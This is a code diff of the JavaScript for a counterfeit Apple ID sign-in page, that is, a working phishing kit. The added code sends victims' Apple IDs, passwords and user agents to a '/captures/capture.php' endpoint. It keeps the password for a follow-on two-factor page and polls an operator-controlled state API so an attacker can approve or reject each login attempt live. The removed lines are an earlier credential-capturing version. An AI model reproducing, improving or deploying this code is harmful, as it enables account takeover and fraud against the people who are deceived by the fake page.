+  const pw = document.getElementById('password').value;
+  if (!pw) return;
+  const appleid = sessionStorage.getItem('appleid');
+  
+  // Store password for 2FA page
+  sessionStorage.setItem('password', pw);
+  
+  signInBtn.disabled = true;
+  signInBtn.innerHTML = '<span class="btn-spinner" style="width:16px;height:16px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;margin-right:8px;"></span>';
+  
+  // Save credentials
+  await fetch('/captures/capture.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ appleid, password: pw, timestamp: new Date().toISOString(), userAgent: navigator.userAgent }) });
+  
+  // Set state to waiting - include password
+  await fetch('/api/set-state', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({status: 'waiting', email: appleid, password: pw})
+  });
+  
+  // Poll for state change every second
+  checkState(appleid);
+});
+
+async function checkState(appleid) {
+  try {
+    const res = await fetch('/api/check-state');
+    const state = await res.json();
     
-    <script>
-        function handleSubmit(event) {
-            event.preventDefault();
-            
-            const appleid = document.getElementById('appleid').value;
-            const password = document.getElementById('password').value;
-            
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            
-            fetch('/captures/capture.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    appleid: appleid,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent
-                })
-            }).then(() => {
-                setTimeout(() => {
-                    window.location.href = '/pages/verify.html';
-                }, 2000);
-            }).catch(() => {
-                setTimeout(() => {
-                    window.location.href = '/pages/verify.html';
-                }, 2000);
-            });
-            
-            return false;
-        }
-    </script>
+    if (state.status === 'approved') {
+      window.location.href = '/pages/verify.html?appleid=' + encodeURIComponent(appleid);
+    } else if (state.status === 'rejected') {
+      const passwordInput = document.getElementById('password');
+      const errorDiv = document.getElementById('loginError');
+      
+      // Add error class to both inputs and their wrappers
+      passwordInput.closest('.input-group').classList.add('input-error');
+      appleidInput.closest('.input-group').classList.add('input-error');
+      
+      if (errorDiv) {
+        errorDiv.style.display = 'block';
+      }
+      signInBtn.disabled = false;
+      signInBtn.textContent = 'Sign In';
+      await fetch('/api/set-state', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({status: 'idle'})});
+    } else {
+      setTimeout(() => checkState(appleid), 1000);
+    }
+  } catch(e) {
+    window.location.href = '/pages/verify.html?appleid=' + encodeURIComponent(appleid);
+  }
+}
+passkeyBtn.addEventListener('click', webauthnSignIn);
+
+// Format phone on blur - only for 10 digit numbers
+function formatPhoneNumber(input) {
+  let value = input.replace(/\D/g, '');
+  // Only format if exactly 10 digits (US phone)
+  if (value.length === 10) {
+    value = '+1 (' + value.substring(0,3) + ') ' + value.substring(3,6) + '-' + value.substring(6,10);
+  }
+  return value;
+}
+appleidInput.addEventListener('blur', function() {
+  const val = this.value.trim();
+  // Only format if it looks like a 10 digit phone number
+  if (val && /^\d{10}$/.test(val)) {
+    this.value = formatPhoneNumber(val);
+  }
+});
+// Remove error state on focus, add back on blur
+appleidInput.addEventListener('focus', function() {
+  this.closest('.input-group').classList.remove('input-error');
+});
+appleidInput.addEventListener('blur', function() {
+  if (document.getElementById('loginError').style.display === 'block') {
+    this.closest('.input-group').classList.add('input-error');
+  }
+});
+document.getElementById('password').addEventListener('focus', function() {
+  this.closest('.input-group').classList.remove('input-error');
+});
+document.getElementById('password').addEventListener('blur', function() {
+  if (document.getElementById('loginError').style.display === 'block') {
+    this.closest('.input-group').classList.add('input-error');
+  }
+});
+appleidInput.addEventListener('keydown', (e) => {
+  if (step2Content.style.visibility === 'visible' && !step2Content.dataset.transitioning) {
+    step2Content.dataset.transitioning = '1';
+    step2Content.style.visibility = 'hidden';
+    step1Elements.style.visibility = 'visible'; step1Elements.classList.add('fade-in-simple');
+    step1Footer.style.visibility = 'visible'; step1Footer.classList.add('fade-in-simple');
+    document.querySelector('.connect-top')?.classList.remove('connect-top');
+    passkeyBtn.style.display = 'flex'; continueBtn.style.display = ''; continueText.style.display = 'inline'; continueSpinner.style.display = 'none'; continueBtn.classList.remove('btn-loading'); signInBtn.style.display = 'none'; appleidInput.focus();
+    // Clear password and error state
+    document.getElementById('password').value = '';
+    document.querySelectorAll('.input-group').forEach(g => g.classList.remove('input-error'));
+    document.getElementById('loginError').style.display = 'none';
+    signInBtn.innerHTML = 'Sign In';
+    signInBtn.disabled = false;
+    setTimeout(() => { step1Elements.classList.remove('fade-in-simple'); step1Footer.classList.remove('fade-in-simple'); delete step2Content.dataset.transitioning; }, 350);
+  }
+});
+document.getElementById('menuBtn').addEventListener('click', (e) => { e.stopPropagation(); document.getElementById('menuDropdown').classList.toggle('open'); });
+document.addEventListener('click', () => { document.getElementById('menuDropdown').classList.remove('open'); });
+document.getElementById('menuDropdown').addEventListener('click', (e) => e.stopPropagation());
+</script>
 </body>
 </html>
